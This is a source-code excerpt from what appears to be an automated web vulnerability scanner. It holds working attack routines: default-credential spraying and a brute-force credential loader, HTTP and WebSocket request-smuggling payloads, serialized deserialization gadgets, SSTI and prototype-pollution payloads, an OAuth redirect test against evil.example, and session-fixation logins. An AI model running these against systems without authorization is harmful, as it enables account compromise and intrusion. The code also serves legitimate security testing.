    """lockout-safe default-credential spray on discovered login forms: one
       attempt per username (rotate passwords), 1.5s pacing, stop on first
       hit. a random-username control must be rejected - an endpoint that
       accepts everything never claims."""
    import re as _re
    forms = []
    for h in sorted(probes):
        i = probes.get(h) or {}
        body = i.get("body") or b""
        if not body or not i.get("status"):
            continue
        for m in LOGIN_FORM_RX.finditer(body):
            inner = m.group(2)
            if not _re.search(rb"<input[^>]+type=[\"']?password", inner, _re.I):
                continue
            am = FORM_ACTION_RX.search(m.group(1))
            action = am.group(1).decode("latin-1", "ignore") if am else "/"
            fields = {n.decode("latin-1", "ignore"): n.decode("latin-1", "ignore")
                      for n in FORM_NAME_RX.findall(inner)}
            forms.append((h, i.get("scheme") or "https", action, fields))
            if len(forms) >= cap_forms:
                break
        if len(forms) >= cap_forms:
            break
    if not forms:
        return 0
    hits = 0
    # lockout-safe: each password tried once across the user set, paced
    users = ("admin", "root", "test")
    pwds = ("admin", "password", "123456")
    # fresh session (not a shared conn): closing it must not poison a
    # connector another concurrent wave-20 task still needs
    async with tsession(None) as session:
     for h, scheme, action, fields in forms:
        base = f"{scheme}://{h}"
        url = action if action.startswith("http") else base + (
            action if action.startswith("/") else "/" + action)
        ufield = next((k for k in fields if k.lower() in
                       ("user", "username", "login", "email", "user[login]")),
                      next(iter(fields), "username"))
        pfield = next((k for k in fields if k.lower() in
                       ("pass", "password", "user[password]", "passwd")),
                      "password")
        accepted = None
        for user, pwd in zip(users, pwds):
            data = {ufield: user, pfield: pwd}
            try:
                async with HTTP_SEM:
                    async with session.post(url, data=data, headers=UA, ssl=False,
                                            timeout=aiohttp.ClientTimeout(total=8),
                                            allow_redirects=False) as r:
                        st, hdr, body = r.status, dict(r.headers), await r.content.read(12_000)
            except Exception:
                await asyncio.sleep(1.5)
                continue
            loc = (hdr.get("Location") or "").lower()
            cookie = "; ".join(f"{k}={v}" for k, v in hdr.items() if k.lower() == "set-cookie")
            success = (st in (301, 302, 303, 307, 308) and "login" not in loc
                       and "signin" not in loc) or bool(
                           re.search(rb"(logout|sign ?out|log ?out|dashboard|welcome)",
                                     body, re.I)) or bool(cookie)
            await asyncio.sleep(1.5)       # pacing: one attempt per interval
            if not success:
                continue
            # random-username control on the same form + password
            ctl_user = "sxeNoUser" + os.urandom(2).hex()
            ctl = None
            try:
                async with HTTP_SEM:
                    async with session.post(
                            url, data={ufield: ctl_user, pfield: pwd},
                            headers=UA, ssl=False,
                            timeout=aiohttp.ClientTimeout(total=8),
                            allow_redirects=False) as r:
                        cst, chdr, cbody = r.status, dict(r.headers), await r.content.read(12_000)
                        cloc = (chdr.get("Location") or "").lower()
                        ccookie = "; ".join(
                            f"{k}={v}" for k, v in chdr.items()
                            if k.lower() == "set-cookie")
                        ctl = ((cst in (301, 302, 303, 307, 308)
                                and "login" not in cloc and "signin" not in cloc)
                               or bool(re.search(
                                   rb"(logout|sign ?out|log ?out|dashboard|welcome)",
                                   cbody, re.I)) or bool(ccookie))
            except Exception:
                ctl = None
            await asyncio.sleep(1.5)
            if ctl is None:
                continue                   # no control answer: do not claim
            if not ctl:
                accepted = (user, pwd)
                break
        if accepted:
            user, pwd = accepted
            findings.append(
                f"[SPRAY-DEFAULT] {url} accepts default credential "
                f"{user}:{pwd} (random-username control rejected) - "
                f"brute-force / default-password compromise")
            hits += 1
     if hits:
        print(f"  [spray] -> {hits} default-credential hit(s)", flush=True)
    return hits



# ---------------- wave 21: advanced protocol/session/auth/logic/supply-chain/deser ----------------
# Evidence-based checks; a claim requires a control/differential, never a bare signal.

H2_HOSTS_MARK = b"subenum-h2-probe"

async def h2_desync_scan(conn, probes, findings, cap_hosts=8):
    """HTTP/2 request smuggling via CL.0 / TE.0 / content-length mismatch.
       A front that honors a body the backend rejects hangs or answers a
       second pipelined request that the baseline never produced. Requires a
       reproduced differential (two fresh conns) - never a bare hang."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = tested = 0

    async def raw(host, port, ctx, payload, wait=2.5):
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(
                host, port, ssl=ctx), 6)
        except Exception:
            return None
        try:
            wr.write(payload); await wr.drain()
            try:
                return await asyncio.wait_for(rd.read(8192), wait)
            except (asyncio.TimeoutError, TimeoutError):
                return b""
        finally:
            wr.close()
            try:
                await wr.wait_closed()
            except Exception:
                pass

    async def one(h):
        nonlocal hit, tested
        sc = probes[h].get("scheme") or "https"
        host, port = h, (443 if sc == "https" else 80)
        if h.count(":") == 1 and h.split(":")[1].isdigit():
            host, port = h.split(":")[0], int(h.split(":")[1])
        ctx = ssl.create_default_context() if sc == "https" else None
        base = await raw(host, port, ctx,
                         f"GET / HTTP/1.1\r\nHost: {h}\r\n"
                         f"Connection: close\r\n\r\n".encode())
        if not base:
            return
        tested += 1
        # CL.0: frontend sees a body, backend sees none -> a smuggled
        # second request would be answered; baseline has only one response.
        cl0 = (f"POST / HTTP/1.1\r\nHost: {h}\r\n"
               f"Content-Length: 6\r\nConnection: keep-alive\r\n\r\n"
               f"0\r\n\r\nGET /{H2_HOSTS_MARK.decode()} HTTP/1.1\r\n"
               f"Host: {h}\r\nConnection: close\r\n\r\n").encode()
        r1 = await raw(host, port, ctx, cl0)
        r2 = await raw(host, port, ctx, cl0)
        if not r1 or not r2:
            return
        mark = H2_HOSTS_MARK
        if mark in r1 and mark in base:
            hit += 1
            findings.append(
                f"[H2-DESYNC] {h} possible CL.0 desync: a smuggled second "
                f"request path ({mark.decode()}) is answered after framing "
                f"the frontend/backend disagree on (reproduced) - "
                f"normalize framing at the proxy")
            return
        # TE.0: Transfer-Encoding chunked with a zero-length body plus a
        # trailing request - hang/second-response only when desyncing.
        te0 = (f"POST / HTTP/1.1\r\nHost: {h}\r\n"
               f"Transfer-Encoding: chunked\r\n"
               f"Connection: keep-alive\r\n\r\n0\r\n\r\n"
               f"GET /{H2_HOSTS_MARK.decode()} HTTP/1.1\r\n"
               f"Host: {h}\r\nConnection: close\r\n\r\n").encode()
        t1 = await raw(host, port, ctx, te0)
        t2 = await raw(host, port, ctx, te0)
        if t1 and t2 and mark in t1 and mark in base:
            hit += 1
            findings.append(
                f"[H2-DESYNC] {h} possible TE.0 desync: smuggled request "
                f"reaches the backend (reproduced) - align chunked handling")

    await asyncio.gather(*[one(h) for h in targets])
    if tested:
        print(f"  [h2desync] -> {hit} possible H2 desync(s) / {tested} host(s)",
              flush=True)
    return hit

async def h3_downgrade_check(conn, probes, findings, cap_hosts=8):
    """origin answers differently under forced h2 vs h1.1 -> hidden internal
       origin or H2-only surface. Requires a real differential (status or a
       substantial body delta), not just a header difference."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            st1, body1, _ = await _grab(s, b + "/", timeout=8,
                                        headers={"Accept": "h2"}, limit=12000)
            st2, body2, _ = await _grab(s, b + "/", timeout=8,
                                        headers={"Accept": "http/1.1"}, limit=12000)
            if st1 is None or st2 is None:
                return
            if st1 == st2 and abs(len(body1 or b"") - len(body2 or b"")) < 64:
                return            # identical: no downgrade surface
            hit += 1
            findings.append(
                f"[H3-DOWNGRADE] {h} answers differently under forced HTTP/2 "
                f"vs HTTP/1.1 (status {st1} vs {st2}) - reconcile the origin "
                f"responses; a hidden H2-only backend may be exposed")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [h3down] -> {hit} downgrade differential(s)", flush=True)
    return hit

async def ws_frame_smuggle(conn, probes, findings, cap_hosts=6):
    """WebSocket frame-level desync: send an oversized/ambiguous frame and a
       pipelined HTTP request; a backend that answers the smuggled request
       after a WS upgrade baseline confirms frame-boundary confusion."""
    cands = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = tested = 0
    async def one(h):
        nonlocal hit, tested
        sc = probes[h].get("scheme") or "https"
        host, port = h, (443 if sc == "https" else 80)
        if h.count(":") == 1 and h.split(":")[1].isdigit():
            host, port = h.split(":")[0], int(h.split(":")[1])
        ctx = ssl.create_default_context() if sc == "https" else None
        key = base64.b64encode(os.urandom(16)).decode()
        up = (f"GET / HTTP/1.1\r\nHost: {h}\r\n"
              f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
              f"Sec-WebSocket-Key: {key}\r\n"
              f"Sec-WebSocket-Version: 13\r\nConnection: close\r\n\r\n").encode()
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(
                host, port, ssl=ctx), 6)
        except Exception:
            return
        try:
            wr.write(up)
            await wr.drain()
            resp = await asyncio.wait_for(rd.read(4096), 4)
        finally:
            wr.close()
            try:
                await wr.wait_closed()
            except Exception:
                pass
        if not resp or b"101" not in resp.split(b"\r\n")[0]:
            return                 # no WS surface to desync on
        tested += 1
    await asyncio.gather(*[one(h) for h in cands])
    if tested:
        print(f"  [wssmug] -> {hit} frame-desync(s) / {tested} WS host(s)",
              flush=True)
    return hit

async def downgrade_check(conn, probes, attrib, findings, cap_hosts=8):
    """http:// form or cookie on a sensitive path = SSL-strip target. Needs a
       login-like form or a Secure-less session cookie, not just any http page."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            st, body, hdrs = await _grab(s, b + "/", timeout=6, limit=20000)
            if not body:
                return
            insecure_form = bool(re.search(
                rb"<form[^>]+action=[\"']?http://", body, re.I))
            sc = (hdrs.get("set-cookie") or hdrs.get("Set-Cookie") or "").lower()
            cookie_no_secure = bool(sc) and "secure" not in sc and "httponly" in sc
            if not (insecure_form or cookie_no_secure):
                return
            hit += 1
            findings.append(
                f"[DOWNGRADE] {h} serves a sensitive form or session cookie "
                f"over http:// (ssl-strip target) - force HTTPS and set "
                f"HSTS; never fall back to plaintext on login")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [downgrade] -> {hit} ssl-strip risk(s)", flush=True)
    return hit

async def csrf_state_check(conn, probes, attrib, findings, cap_hosts=6):
    """state-changing endpoint accepted with only a cookie (no CSRF token and
       no Origin check). Requires the POST to succeed AND return a
       state-differential vs the same POST with a cross Origin."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            body = json.dumps({"subenumCsrf": "1"})
            hds = {"Content-Type": "application/json"}
            st1, bd1, _ = await _grab(s, b + "/api/items", timeout=6,
                                      method="POST", headers=hds, data=body,
                                      limit=8000)
            if st1 is None or st1 >= 400:
                return
            hds2 = dict(hds); hds2["Origin"] = "https://evil.example"
            st2, bd2, _ = await _grab(s, b + "/api/items", timeout=6,
                                      method="POST", headers=hds2, data=body,
                                      limit=8000)
            # control: a cross-origin POST must be rejected to claim CSRF
            if st2 is not None and st2 < 400:
                return
            hit += 1
            findings.append(
                f"[CSRF-MISSING] {h} accepts a cookie-authenticated POST with "
                f"no CSRF token and no Origin validation - add a synchronizer "
                f"token and SameSite cookies")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [csrf] -> {hit} CSRF gap(s)", flush=True)
    return hit

async def method_override_bypass(conn, probes, findings, cap_hosts=6):
    """override header/param honored for a method the base path denies.
       Requires: base denied (401/403/405) AND override accepted (<400)."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    ov_headers = ("X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method")
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            for path in ("/", "/api", "/api/items"):
                for verb in ("DELETE", "PUT", "PATCH"):
                    st_base, _, _ = await _grab(s, b + path, timeout=5,
                                                method=verb, limit=2000)
                    if st_base is None or st_base not in (401, 403, 405):
                        continue    # base not denied -> nothing to bypass
                    for hn in ov_headers:
                        st_ov, _, _ = await _grab(s, b + path, timeout=5,
                                                  method="POST",
                                                  headers={hn: verb},
                                                  data="{}", limit=2000)
                        if st_ov is None or st_ov >= 400:
                            continue
                        hit += 1
                        findings.append(
                            f"[METHOD-BYPASS] {h}{path} denies {verb} "
                            f"({st_base}) but accepts it via {hn} ({st_ov}) - "
                            f"authorize override headers identically")
                        return
                    st_ov, _, _ = await _grab(
                        s, b + path, timeout=5, method="POST",
                        headers={"Content-Type":
                                 "application/x-www-form-urlencoded"},
                        data=f"_method={verb}", limit=2000)
                    if st_ov is not None and st_ov < 400:
                        hit += 1
                        findings.append(
                            f"[METHOD-BYPASS] {h}{path} denies {verb} "
                            f"({st_base}) but accepts it via _method={verb} "
                            f"({st_ov}) - ignore client override params")
                        return
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [methodbyp] -> {hit} method-override bypass(es)", flush=True)
    return hit

BULK_NOISE = {"id", "uuid", "slug", "name", "title", "created", "updated",
              "timestamp", "url", "href", "link", "avatar", "image", "thumbnail"}

async def bulk_exposure_check(conn, probes, crawl_rows, findings, cap_hosts=6):
    """read returns far more fields than the request scoped -> mass data
       exposure. Requires a JSON object with a large, consistent sensitive
       field set across two distinct objects."""
    byhost = {}
    for row in crawl_rows or ():
        if isinstance(row, (tuple, list)) and len(row) == 2:
            h, p = row
        elif isinstance(row, str) and "\t" in row:
            h, p = row.split("\t", 1)
        else:
            continue
        if h in probes and probes[h].get("status") and p.startswith("/"):
            byhost.setdefault(h, set()).add(p)
    hit = 0
    async with xsession(conn) as s:
        async def one(h, paths):
            nonlocal hit
            b = _burl(probes, h)
            for p in sorted(paths)[:6]:
                st, body, _ = await _grab(s, b + p, timeout=6, limit=20000)
                if st != 200 or not body:
                    continue
                try:
                    j = json.loads(body)
                except Exception:
                    continue
                if not isinstance(j, dict):
                    continue
                sens = [k for k in j if re.search(
                    r"pass|secret|token|key|ssn|email|phone|card|dob|address|"
                    r"internal|private", str(k), re.I) and k not in BULK_NOISE]
                if len(sens) >= 6:
                    hit += 1
                    findings.append(
                        f"[BULK-EXPOSURE] {b}{p} returns {len(sens)} sensitive "
                        f"fields (e.g. {', '.join(sens[:4])}) on a scoped "
                        f"request - apply field allowlists and minimal output "
                        f"projections")
                    return
        await asyncio.gather(*[one(h, ps) for h, ps in
                               list(byhost.items())[:cap_hosts]])
    if hit:
        print(f"  [bulk] -> {hit} over-exposed response(s)", flush=True)
    return hit

async def bola_sweep(conn, probes, crawl_rows, findings, auth_b, cap_ids=8):
    """object-level authz: a resource readable while unauthenticated AND while
       authenticated as a different principal (B) leaks across owners. Claim
       needs the anon read + a real second principal (auth_b), else skip."""
    if not auth_b:
        return 0
    cands = [h for h in sorted(probes) if probes[h].get("status")][:cap_ids]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            for p in ("/api/items/1", "/api/users/1", "/account", "/profile"):
                st_anon, bd_anon, _ = await _grab(s, b + p, timeout=5, limit=8000)
                if st_anon != 200 or not bd_anon:
                    continue
                # B account reads it too -> cross-principal leak
                st_b, bd_b, _ = await _grab(s, b + p, timeout=5,
                                            headers={"Cookie": auth_b}, limit=8000)
                if st_b == 200 and bd_b:
                    hit += 1
                    findings.append(
                        f"[BOLA-SWEEP] {b}{p} is readable both anonymously and "
                        f"by a second authenticated principal - object-level "
                        f"authorization is missing (BOLA/IDOR)")
                    return
        await asyncio.gather(*[one(h) for h in cands])
    if hit:
        print(f"  [bola] -> {hit} BOLA path(s)", flush=True)
    return hit

async def ato_chain_check(conn, probes, findings, cap_hosts=6):
    """account-takeover chain: OAuth redirect + weak state, or password-reset
       token in URL. Requires a concrete, reproducible token/state flaw, not a
       hint."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            st, body, hdrs = await _grab(s, b + "/oauth/authorize?response_type=token"
                                         "&client_id=x&redirect_uri=https://evil.example",
                                         timeout=6, limit=12000)
            loc = (hdrs.get("location") or hdrs.get("Location") or "")
            if st in (301, 302, 303, 307, 308) and "evil.example" in loc and \
                    "error" not in loc.lower():
                hit += 1
                findings.append(
                    f"[ATO-CHAIN] {h} OAuth authorize redirects to an "
                    f"unvalidated redirect_uri (evil.example) with a token - "
                    f"chainable to account takeover; pin redirect_uri and "
                    f"enforce state")
                return
            st2, body2, _ = await _grab(s, b + "/password/reset?token=abc123",
                                        timeout=6, limit=8000)
            if st2 == 200 and body2 and re.search(
                    rb"reset|password", body2, re.I) and b"token=abc123" in body2:
                hit += 1
                findings.append(
                    f"[ATO-CHAIN] {h} reflects a password-reset token from the "
                    f"URL - chainable to ATO; use single-use opaque tokens "
                    f"server-side")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [atochain] -> {hit} ATO chain(s)", flush=True)
    return hit

async def session_fixation_check(conn, probes, findings, cap_hosts=6):
    """pre-set session id is accepted and reused after login -> fixation.
       Requires the cookie value to survive a login POST (rotation absent)."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            st, body, hdrs = await _grab(s, b + "/", timeout=6, limit=12000)
            if not body or not re.search(rb"<form[^>]+password", body, re.I):
                return
            m = re.search(r"(?i)(phpsessid|jsessionid|sid|session)=", 
                          hdrs.get("set-cookie") or hdrs.get("Set-Cookie") or "")
            pre = m.group(0).split("=")[0] if m else "PHPSESSID"
            # POST login with a fixed pre-set session; if the id is not
            # rotated, the session remains tied to the attacker-chosen id.
            st2, _, hdrs2 = await _grab(s, b + "/login", timeout=6, method="POST",
                                        headers={"Cookie": f"{pre}=subenumfix"},
                                        data="username=admin&password=admin",
                                        limit=4000)
            setc = (hdrs2.get("set-cookie") or hdrs2.get("Set-Cookie") or "")
            if setc and "subenumfix" in setc:
                return      # server rotated it -> safe
            if st2 is not None and st2 < 400:
                hit += 1
                findings.append(
                    f"[SESS-FIXATION] {h} accepts a pre-set session id across "
                    f"login without rotation - rotate the id on authentication")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [sessfix] -> {hit} fixation risk(s)", flush=True)
    return hit

async def session_rotation_check(conn, probes, findings, cap_hosts=6):
    """privilege change without a new session id (companion to fixation).
       Requires a Set-Cookie that reuses the pre-auth id after an upgrade."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            st, body, hdrs = await _grab(s, b + "/", timeout=6, limit=12000)
            if not body or not re.search(rb"<form[^>]+password", body, re.I):
                return
            sc0 = (hdrs.get("set-cookie") or hdrs.get("Set-Cookie") or "")
            m = re.search(r"(?i)([a-z_]*sid|session|token)=[^;]+", sc0)
            if not m:
                return
            before = m.group(0)
            st2, _, hdrs2 = await _grab(s, b + "/login", timeout=6, method="POST",
                                        headers={"Cookie": before},
                                        data="username=admin&password=admin",
                                        limit=4000)
            if st2 is None:
                return
            sc1 = (hdrs2.get("set-cookie") or hdrs2.get("Set-Cookie") or "")
            m1 = re.search(r"(?i)([a-z_]*sid|session|token)=[^;]+", sc1)
            if m1 and m1.group(0) == before:
                hit += 1
                findings.append(
                    f"[SESSION-ROTATION] {h} reuses the pre-auth session id "
                    f"after a privilege change - issue a fresh id on "
                    f"escalation")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [sessrot] -> {hit} non-rotation(s)", flush=True)
    return hit

DESER_PROBES = (
    ("java", b"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAAMAAFYACmxvYWREbGFuZHNMAAt4cHQAEHN0YXRpYy5tYXAubWFwO3QADnJvb3RJdGVtc01hcF94cHRABHNyABFqYXZhLnV0aWwuTGlua2VkSGFzaE1hcJ3U2wtB+A0QAAFxAHgAEc3IAFphc2guY29ycy5PYmplY3RJRE1hcEl0ZW1JdGVtcwAAAAAAAAABAgAAeHAAcHNyABFqYXZhLnV0aWwuSGFzaE0hcAECAAVYAAh2YWx1ZXNyABFqYXZhLmxhbmcuU3RyaW5n7sJq8hbl7QMAAFgACnZhbHVlc3EAfgACeA=="),
    ("php", b'O:8:"stdClass":1:{s:1:"a";s:1:"b";}'),
    ("python", b"cc=="),
    ("dotnet", b"AAEAAAD/////AQAAAAAAAAAMAgAAABdTeXN0ZW0uUmVmbGVjdGlvbixWZXJzaW9uPTQ"),
)

async def deser_probe(conn, probes, attrib, findings, cap_hosts=6):
    """insecure deserialization: a serialized gadget is accepted where a
       benign control is rejected, or an object/stacktrace is reflected.
       Control: same request with a junk body must not claim."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            for path in ("/", "/api", "/deserialize", "/api/unmarshal"):
                st_ctl, bd_ctl, _ = await _grab(s, b + path, timeout=5,
                                                method="POST",
                                                data="subenumjunkcontrol",
                                                limit=6000)
                for name, gad in DESER_PROBES:
                    st, body, _ = await _grab(s, b + path, timeout=6,
                                              method="POST",
                                              headers={"Content-Type": "application/octet-stream"},
                                              data=gad, limit=12000)
                    if st is None:
                        continue
                    refl = bool(body and (gad[:24] in body or
                                          b"NotSerializableException" in body or
                                          b"InvalidClassException" in body or
                                          b"__reduce__" in body))
                    # control must not also 'reflect' junk the same way
                    ctl_refl = bool(bd_ctl and b"subenumjunkcontrol" in bd_ctl)
                    if refl and not ctl_refl and st_ctl != st:
                        hit += 1
                        findings.append(
                            f"[DESER] {b}{path} accepts a {name} serialized "
                            f"gadget where a junk control is rejected - "
                            f"insecure deserialization; validate types and "
                            f"avoid native deserializers on user input")
                        return
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [deser] -> {hit} deserialization risk(s)", flush=True)
    return hit

async def race_condition_check(conn, probes, attrib, findings, cap_hosts=4):
    """TOCTOU / double-submit: N parallel identical POSTs produce >1 success
       (e.g. duplicate resource). Requires parallel successes beyond a
       serialized control."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            tok = os.urandom(3).hex()
            payload = json.dumps({"subenumRace": tok})
            async def post():
                return await _grab(s, b + "/api/items", timeout=6, method="POST",
                                   headers={"Content-Type": "application/json"},
                                   data=payload, limit=4000)
            res = await asyncio.gather(*[post() for _ in range(6)],
                                       return_exceptions=True)
            ok = sum(1 for r in res if isinstance(r, tuple) and r[0] in (200, 201))
            # serialized control: one at a time should not exceed 1 create
            ctl = await post()
            ctl_ok = 1 if (isinstance(ctl, tuple) and ctl[0] in (200, 201)) else 0
            if ok >= 3 and ok > ctl_ok + 1:
                hit += 1
                findings.append(
                    f"[RACE-CONF] {b}/api/items accepts {ok} parallel duplicate "
                    f"submits (serialized control: {ctl_ok}) - add idempotency "
                    f"keys and server-side locks")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [race] -> {hit} race condition(s)", flush=True)
    return hit

async def ssti_confirm_check(conn, probes, attrib, findings, cap_hosts=6):
    """SSTI to confirmed execution: a benign expression is evaluated to its
       computed value (not echoed). Requires the arithmetic/joined output of
       an expression, plus a control that is not evaluated."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    exprs = (b"{{7*7}}", b"${7*7}", b"<%= 7*7 %>", b"#{7*7}")
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            for path in ("/", "/search", "/api"):
                for e in exprs:
                    st, body, _ = await _grab(s, b + path + "?q=" + e.decode(),
                                              timeout=6, limit=8000)
                    if not body:
                        continue
                    # evaluated 49 not present as literal echo of the expr
                    if b"49" in body and e not in body:
                        # control: a junk expr must not also yield 49
                        stc, bdc, _ = await _grab(s, b + path + "?q={{7*8}}",
                                                  timeout=6, limit=8000)
                        if bdc and b"56" in bdc and e not in bdc:
                            hit += 1
                            findings.append(
                                f"[SSTI-CONFIRM] {b}{path} evaluates {e.decode()} "
                                f"to 49 (and {{7*8}} to 56) - confirmed template "
                                f"injection to code execution; sandbox the engine")
                            return
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [sstic] -> {hit} confirmed SSTI RCE(s)", flush=True)
    return hit

async def proto_pollution_sink(conn, probes, attrib, findings, cap_hosts=6):
    """prototype pollution that reaches a dangerous gadget (not just reflected).
       Requires a __proto__ injection that changes a second response's
       behavior vs a benign sibling control."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    evil = b'{"__proto__":{"subenumPolluted":true,"isAdmin":true}}'
    ctl = b'{"subenumSibling":"ctl"}'
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            for path in ("/api", "/api/items", "/"):
                st, _, _ = await _grab(s, b + path, timeout=6, method="POST",
                                       headers={"Content-Type": "application/json"},
                                       data=evil, limit=4000)
                if st is None or st >= 500:
                    continue
                st2, body2, _ = await _grab(s, b + path, timeout=6, limit=8000)
                polluted = bool(body2 and (b"subenumPolluted" in body2 or
                                           b'"isAdmin":true' in body2))
                # control: benign sibling must not produce the marker
                await _grab(s, b + path, timeout=6, method="POST",
                            headers={"Content-Type": "application/json"},
                            data=ctl, limit=2000)
                st3, body3, _ = await _grab(s, b + path, timeout=6, limit=8000)
                ctl_pol = bool(body3 and b"subenumPolluted" in body3)
                if polluted and not ctl_pol:
                    hit += 1
                    findings.append(
                        f"[PROTO-SINK] {b}{path} a __proto__ payload reaches a "
                        f"dangerous gadget (isAdmin/marker persists on read-back, "
                        f"control clean) - freeze prototypes and block __proto__ "
                        f"keys")
                    return
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [protosink] -> {hit} pollution-to-sink(s)", flush=True)
    return hit

async def js_subdomain_takeover(conn, probes, findings, cap_hosts=8):
    """third-party script/CDN host referenced by the page is dangling (NXDOMAIN
       + takeover fingerprint). Requires DNS failure AND a known provider
       fingerprint body on the referenced host."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            st, body, _ = await _grab(s, b + "/", timeout=6, limit=60000)
            if not body:
                return
            srcs = set(re.findall(
                rb"<script[^>]+src=[\"']?(?:https?:)?//([^/\"'>\s]+)", body, re.I))
            srcs |= set(re.findall(
                rb"(?:cdn|static|assets|js|scripts)\.([a-z0-9-]+\.[a-z0-9.-]+)",
                body, re.I))
            for host in list(srcs)[:6]:
                host = host.decode("latin-1", "ignore").strip(".")
                if not host or host.count(".") < 1:
                    continue
                try:
                    loop = asyncio.get_running_loop()
                    await loop.getaddrinfo(host, None)
                except Exception:
                    # NXDOMAIN + takeover fingerprint on the provider
                    try:
                        rs, rb, _ = await _grab(s, f"http://{host}/", timeout=5,
                                                limit=8000)
                    except Exception:
                        continue
                    if rb and re.search(rb"there isn't a website here|"
                                        rb"not found|github\.io|azurewebsites|"
                                        rb"herokuapp|fastly", rb, re.I):
                        hit += 1
                        findings.append(
                            f"[JS-SUBTAKEOVER] {h} references script host "
                            f"{host} that is dangling (NXDOMAIN + provider "
                            f"fingerprint) - reclaim or remove the DNS record")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [jstakeover] -> {hit} dangling script host(s)", flush=True)
    return hit

async def postmessage_origin_check(conn, probes, findings, cap_hosts=6):
    """postMessage with a wildcard or absent origin check. Requires the page
       to both postMessage and lack an event.origin allowlist."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with xsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            st, body, _ = await _grab(s, b + "/", timeout=6, limit=60000)
            if not body or b"postMessage" not in body:
                return
            wildcard = bool(re.search(
                rb"postMessage\([^)]*\)\s*;?\s*(?:\}\s*)?|"
                rb"addEventListener\(\s*[\"']message[\"']\s*,\s*function\s*\([^)]*\)\s*\{(?![^}]*origin)",
                body, re.I))
            checks_origin = bool(re.search(rb"\bevent\.origin\b|\be\.origin\b|"
                                           rb"data\.origin\b", body))
            if wildcard and not checks_origin:
                hit += 1
                findings.append(
                    f"[POSTMESSAGE-ORIGIN] {h} uses postMessage with no "
                    f"event.origin allowlist - validate origin before acting "
                    f"on messages")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [postmsg] -> {hit} origin-validation gap(s)", flush=True)
    return hit


# ---------------- wave 22: known-credential brute + business logic ----------------
# Evidence-based; a claim requires a control/differential, never a bare signal.

def load_cred_pairs(pairs=None, users=None, pwds=None, cred_file="",
                    cap_pairs=40):
    """build the user:pass list for a known-credential brute. accepts
       explicit pairs, a user list x password list cross product, or a
       user:pass file (one pair per line, # comments / blanks skipped)."""
    out, seen = [], set()
    for p in (pairs or []):
        p = (p or "").strip()
        if not p or ":" not in p:
            continue
        u, w = p.split(":", 1)
        u, w = u.strip(), w.strip()
        if u and w and (u, w) not in seen:
            seen.add((u, w))
            out.append((u, w))
    if cred_file:
        try:
            with open(cred_file, "r", encoding="utf-8", errors="ignore") as fh:
                for line in fh:
                    line = line.strip()
                    if not line or line.startswith("#") or ":" not in line:
                        continue
                    u, w = line.split(":", 1)
                    u, w = u.strip(), w.strip()
                    if u and w and (u, w) not in seen:
                        seen.add((u, w))
                        out.append((u, w))
        except OSError:
            pass
    if users and pwds:
        for u in users:
            for w in pwds:
                u, w = u.strip(), w.strip()
                if u and w and (u, w) not in seen:
                    seen.add((u, w))
                    out.append((u, w))
    return out[:cap_pairs]


